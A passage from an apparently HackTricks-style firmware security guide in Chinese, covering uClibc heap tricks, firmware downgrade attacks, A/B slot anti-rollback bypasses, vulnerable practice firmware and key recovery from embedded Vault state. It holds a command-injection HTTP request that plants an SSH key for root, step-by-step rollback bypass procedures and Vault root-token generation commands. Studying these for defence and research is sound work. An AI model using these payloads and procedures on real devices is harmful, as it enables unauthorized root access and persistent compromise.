- **Fastbin 和 consolidation：**uClibc 使用类似于 glibc 的 fastbin。后续的大型 allocation 可能触发 `__malloc_consolidate()`，因此任何伪造的 chunk 都必须通过检查（合理的 size、`fd = 0`，并且周围的 chunk 被视为“正在使用”）。<sup>[[6]](#references)</sup>
- **ASLR 下的 non-PIE binary：**如果启用了 ASLR，但主 binary 是 **non-PIE**，那么 binary 内的 `.data/.bss` 地址是稳定的。可以利用一个已经类似于有效 heap chunk header 的区域，让 fastbin allocation 落到 **function pointer table** 上。
- **停止 parser 的 NUL：**解析 JSON 时，payload 中的 `\x00` 可以停止解析，同时保留其后的攻击者可控字节，用于 stack pivot/ROP chain。
- **通过 `/proc/self/mem` 执行 shellcode：**使用 `open("/proc/self/mem")`、`lseek()` 和 `write()` 的 ROP chain，可以将可执行 shellcode 写入已知 mapping 并跳转到该处。

## 用于 Firmware Analysis 的预配置操作系统

[AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 等操作系统提供了预配置环境，用于 firmware security testing，并配备了所需工具。

## 用于 Firmware 分析的预配置 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos)：AttifyOS 是一个 distro，旨在帮助你对 Internet of Things (IoT) 设备进行 security assessment 和 penetration testing。它提供了预配置环境并加载了所有必要工具，能为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS)：基于 Ubuntu 18.04 的 embedded security testing 操作系统，预装了 firmware security testing 工具。

## Firmware Downgrade 攻击和不安全的 Update 机制

即使 vendor 对 firmware image 实现了 cryptographic signature 检查，**version rollback（downgrade）保护也经常缺失**。如果 boot 或 recovery loader 只使用嵌入的 public key 验证 signature，却不比较待刷入 image 的 *version*（或 monotonic counter），攻击者就能合法安装**带有有效 signature 的旧版易受攻击 firmware**，从而重新引入已修补的漏洞。<sup>[[4]](#references)</sup>

典型攻击流程：

1. **获取旧版签名镜像**
   * 从 vendor 的公开下载门户、CDN 或支持网站获取。
   * 从配套的 mobile/desktop application 中提取（例如 Android APK 内的 `assets/firmware/`）。
   * 从 VirusTotal、Internet archive、论坛等第三方 repository 获取。
2. 通过任何可用的 update channel **上传镜像或将其提供给设备**：
   * Web UI、mobile-app API、USB、TFTP、MQTT 等。
   * 许多 consumer IoT 设备会暴露*未认证*的 HTTP(S) endpoint，接受 Base64 编码的 firmware blob，在 server 端解码并触发 recovery/upgrade。
3. Downgrade 后，利用较新版本中已修补的漏洞（例如后来添加的 command-injection filter）。
4. 获得 persistence 后，可选择重新刷入最新镜像或禁用 updates，以避免被发现。

### 示例：Downgrade 后的 Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

在存在漏洞的（降级后的）固件中，`md5` 参数未经清理便直接拼接到 shell 命令中，因此可以注入任意命令（此处用于启用基于 SSH 密钥的 root 访问）。后续固件版本加入了基本的字符过滤，但由于缺少降级保护，这项修复形同虚设。<sup>[[4]](#references)</sup>

### 从移动应用中提取固件

许多厂商会将完整的固件镜像打包在配套的移动应用中，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些软件包通常以未加密的形式存储在 APK/APEX 的 `assets/fw/` 或 `res/raw/` 等路径下。使用 `apktool`、`ghidra` 等工具，甚至普通的 `unzip`，都可以提取已签名的镜像，而无需接触实体硬件。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot 设计中仅限 updater 的 anti-rollback 绕过

有些厂商确实实现了 anti-downgrade **ratchet**，但只在 *updater* 逻辑中实现（例如通过 CAN 运行的 UDS 例程、recovery 命令或 userspace OTA agent）。如果 **bootloader** 后续只检查镜像签名/CRC，并信任分区表或 slot 元数据，仍然可以绕过 rollback protection。<sup>[[7]](#references)</sup>

典型的弱设计：

- Firmware 元数据同时包含版本描述符和 **security ratchet** / monotonic counter。
- Updater 将镜像的 ratchet 与持久化存储中的值进行比较，并拒绝较旧的已签名镜像。
- Bootloader **不会**解析 ratchet，只会在启动所选 slot 前验证 header、CRC 和签名。
- Slot 激活状态单独存储在分区表或每个 slot 的 generation counter 中，且**未通过加密方式绑定**到已验证的确切 firmware digest。

这会在双 slot 系统中形成一种**验证一个镜像 / 启动另一个镜像**的原语。如果攻击者能让 updater 使用当前的已签名镜像将 slot B 标记为下次启动目标，并在重启前覆盖 slot B，bootloader 仍可能启动降级后的镜像，因为它只信任已提交的 slot 元数据。

常见滥用模式：

1. 将**当前的已签名** firmware 上传到被动 slot，并运行正常的验证/切换例程，让布局将该 slot 标记为下一个活动 slot。
2. **暂时不要重启**。在同一会话中重新进入 slot-preparation/erase 例程。
3. 利用过时的 boot-state 或过时的 slot-selection 逻辑，让 updater 擦除刚刚提升的**同一个物理 slot**。
4. 将**较旧但仍经过签名**的 firmware 写入该 slot。
5. 跳过强制执行 ratchet 的验证例程，直接重启。
6. Bootloader 选择已提升的 slot，只验证签名/完整性，然后启动旧镜像。

逆向分析 A/B update 实现时要注意：

- Slot 选择由**启动时标志**决定，而这些标志在切换成功后不会刷新。
- 类似 `prepare_passive_slot()` 的例程根据过时状态擦除 slot，而不是依据**当前已提交的布局**。
- 类似 `part_write_layout()` 的函数只递增**generation counter** / active flag，却不保存已验证镜像的 hash。
- Ratchet 检查在 userspace 或 updater 代码中实现，但**未在** ROM / bootloader / secure boot 阶段实现。
- 擦除或 recovery 例程会在 slot 内容被移除并重写后，仍将该 slot 保留为可启动状态。

### Update Logic 评估清单

* *update endpoint* 的传输/身份验证是否受到充分保护（TLS + authentication）？
* 设备在刷写前是否比较**版本号**或**单调递增的 anti-rollback counter**？
* 镜像是否在 secure boot chain 内验证（例如由 ROM 代码检查签名）？
* **Bootloader 是否执行与 updater 相同的 ratchet**，而不只是检查签名/CRC？
* Slot 激活元数据是否**绑定到已验证的 firmware digest/version**，还是 slot 在提升后仍可被修改？
* Slot 切换成功后，设备是否会被强制重启，还是同一会话中仍可调用后续的 update/erase 例程？
* Userland 代码是否执行额外的合理性检查（例如允许的分区映射、型号）？
* *部分*或*备份* update 流程是否复用了相同的验证逻辑？

> 💡  如果缺少上述任何一项，该平台很可能容易受到 rollback attacks 的攻击。

## 用于练习的易受攻击 firmware

要练习发现 firmware 中的漏洞，可以从以下易受攻击的 firmware 项目入手。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 从嵌入式 KMS/Vault 状态中恢复 firmware 解密密钥

当 update 镜像将少量明文元数据与大型高熵数据块混合在一起时，应先进行容器初步分析，再尝试暴力破解任何内容：<sup>[[1]](#references)</sup>

- 使用 `hexdump`、`xxd`、`strings -tx`、`base64 -d` 和 `binwalk -E` 转储 headers、offsets 和行边界。
- `Salted__` 通常表示 OpenSSL `enc` 格式：接下来的 8 个字节是 salt，其余字节是 ciphertext。
- 解码后恰好为 `256` 字节的 Base64 字段，强烈暗示这是用于封装随机 firmware password/session key 的 RSA-2048 ciphertext。
- 同一文件中的 detached PGP 数据通常只用于保护真实性；不要假设它是保密机制。

如果静态密钥搜索（`grep`、`strings`、PEM/PGP 搜索）没有结果，应逆向分析**实际解密路径**，而不是只搜索私钥：

- 反编译 updater / management binary，追踪哪个组件读取加密数据块、哪个 helper/API 对其解封装，以及它请求的逻辑密钥名称。
- 在提取出的 root filesystem 中搜索 KMS 状态（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`），以及 unit 文件和 init 脚本。
- 将明文形式的 `vault operator unseal ...`、recovery keys、bootstrap tokens 或本地 KMS 自动解封装脚本视为等同于私钥材料。

如果设备附带原始 Vault binary 和存储后端，重现该环境通常比重新实现 Vault 内部机制更容易：

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

在克隆的 KMS 上取得 root 后：

- 仅在隔离的克隆环境中将 transit keys 设为可导出：`vault write transit/keys/<name>/config exportable=true`
- 导出 unwrap key：`vault read transit/export/encryption-key/<name>`
- 使用 KMS 所用的确切填充/哈希组合尝试恢复的 RSA key。PKCS#1 v1.5 解密失败、默认 OAEP 解密失败，**都不能**证明 key 有误；许多基于 Vault 的流程使用 SHA-256 的 OAEP，而常见库默认使用 SHA-1。
- 如果 payload 以 `Salted__` 开头，请准确复现厂商的 OpenSSL KDF（`EVP_BytesToKey`，旧款设备上通常使用 MD5），再尝试 AES-CBC 解密。

这样，“加密固件”就变成了一个更通用的问题：**恢复设备端的运行密钥，然后离线复现确切的 unwrap + KDF 参数**。

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [使用 Claude 破解固件：资深水平的技能，初级水平的自主性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [固件安全测试方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [实用 IoT Hacking：攻击物联网的权威指南](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [在废弃硬件中利用零日漏洞——Trail of Bits 博客](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [一台 20 美元的智能设备如何让我访问你的家](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [现在你看见 mi：现在你被 Pwn 了](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 从充电端口连接器利用 Tesla Wall Connector - 第 2 部分：绕过防降级机制](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [让它闪烁：通过无线方式利用 Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [在 QEMU 上 ROOT Tesla OS 第 1 部分：解包](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux 内核文档 - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [在 QEMU 上 ROOT Tesla OS 第 2 部分：调试与修复](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS 密码：弱 XOR 加密可从 SPI Flash 中恢复密码（CVE-2026-40639）](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS 密码恢复工具](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — 硬件 Hacking 进阶第 2 部分](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
